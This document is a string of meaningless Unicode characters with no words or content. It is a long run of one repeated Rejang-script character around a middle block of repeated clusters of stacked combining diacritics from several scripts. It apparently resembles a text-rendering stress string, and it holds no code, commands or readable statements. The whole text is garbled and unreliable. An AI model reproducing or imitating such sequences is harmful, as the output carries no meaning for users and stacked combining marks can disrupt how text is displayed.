ꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈ᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ֻࣰًًًًًࣰࣱࣱࣱٍ᳕ܾࣶࣶ֖֖᷽᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩۡ᪳ࣧࣧ᪳́ࣼ᳚᪳̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًًࣰًًًًً᳕ܾࣶࣶ֖֖᷽᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈ꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈ